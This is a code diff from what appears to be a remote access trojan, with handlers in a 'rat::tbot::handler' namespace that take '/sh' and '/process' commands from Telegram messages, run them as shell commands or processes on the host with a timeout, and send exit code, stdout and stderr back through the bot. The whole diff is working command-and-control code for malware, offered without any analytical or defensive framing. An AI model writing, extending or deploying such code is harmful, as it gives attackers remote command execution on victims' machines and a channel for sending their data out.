@@ -48,6 +48,7 @@ static inline size_t __findFirstOccurenceOfChar(const std::string& Input_String,
   }
   return pos;
 }
+
 std::string _parseAndHandleShellCommand(Message& Telegram_Message) {
     Telegram_Message.text.erase(0, 4); //erase / s h and space;
     
@@ -71,50 +72,16 @@ std::string _parseAndHandleShellCommand(Message& Telegram_Message) {
         return fmt::format("Invalid timeout value: {}", timeout_string);
     }
 
-    return rat::system::runCommand(command, static_cast<uint32_t>(timeout) );
+    return rat::system::runShellCommand(command, static_cast<unsigned int>(timeout) );
 }
 
-std::string _parseAndHandleProcessCommand(const Bot& bot, Message& Telegram_Message) {
-    Telegram_Message.text.erase(0, 9); // trim the start of /process
-    boost::trim(Telegram_Message.text); // trim extra whitespaces at edges
-
-    const std::string& command = Telegram_Message.text;
-    auto start_time = std::chrono::system_clock::now();
-
-    rat::system::TinyTask tiny_task;
-    tiny_task.command = command;
-    tiny_task.parameters = {};
-    tiny_task.timeout_ms = 0;
-    auto end_time = std::chrono::system_clock::now();
-    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time).count();
-
-
-    std::string response = fmt::format(
-                "Process finished.\n"
-                "Start: {:%Y-%m-%d %H:%M:%S}\n"
-                "End: {:%Y-%m-%d %H:%M:%S}\n"
-                "Duration: {} ms\n",
-                start_time,  // directly works with chrono::time_point
-                end_time,
-                ms
-            );
-            bot.sendMessage(response);
-
-    bool success = rat::system::runSeparateProcess(tiny_task);
-    return fmt::format(
-        "Process start {}: {}, response_buffer: {}",
-        success ? "successful" : "failed",
-        command,
-        tiny_task.output_buffer
-    );
-}
-
-std::string _parseAndHandleSystemCommand(const Bot& arg_Bot, Message& Telegram_Message) {
-    Telegram_Message.text.erase(0, 5); //erase / s h and space;
+std::string _parseAndHandleProcessCommand(Bot& arg_Bot, Message& Telegram_Message) {
+    Telegram_Message.text.erase(0, 9); //erase / s h and space;
     
     boost::trim(Telegram_Message.text);
     
     size_t space_char_pos = __findFirstOccurenceOfChar(Telegram_Message.text, ' ');
+    const std::string timeout_string = Telegram_Message.text.substr(0, space_char_pos);
     
     Telegram_Message.text.erase(0, space_char_pos);
     
@@ -122,13 +89,33 @@ std::string _parseAndHandleSystemCommand(const Bot& arg_Bot, Message& Telegram_M
     
     const std::string& command = Telegram_Message.text;
     
-    std::string output_buffer;
-    std::string error_buffer;
-    rat::system::runSystemCommand(command, output_buffer, error_buffer);
-    return fmt::format("Output:{}\nError:{}",  output_buffer, error_buffer);
+    int timeout = 0;
+    
+    try {
+        timeout = std::stoi(timeout_string);
+    }
+    catch (const std::exception&) {
+        return fmt::format("Invalid timeout value: {}", timeout_string);
+    }
 
+    
+    return rat::system::runProcess(
+        command, 
+        timeout, 
+        [bot_copy = arg_Bot](rat::system::ProcessResult res) mutable {
+            std::string feedback;
+            if (res.exit_code == -1) {
+                feedback = "Process killed (timeout exceeded).";
+            } else {
+                feedback = fmt::format(
+                    "Process exited with code {}\nSTDOUT:\n{}\nSTDERR:\n{}",
+                    res.exit_code,
+                    res.stdout_str,
+                    res.stderr_str
+                );
+            }
+            bot_copy.sendMessage(feedback);
+        }
+    );
 }
-
-
-
 }//namespace rat::tbot::handler
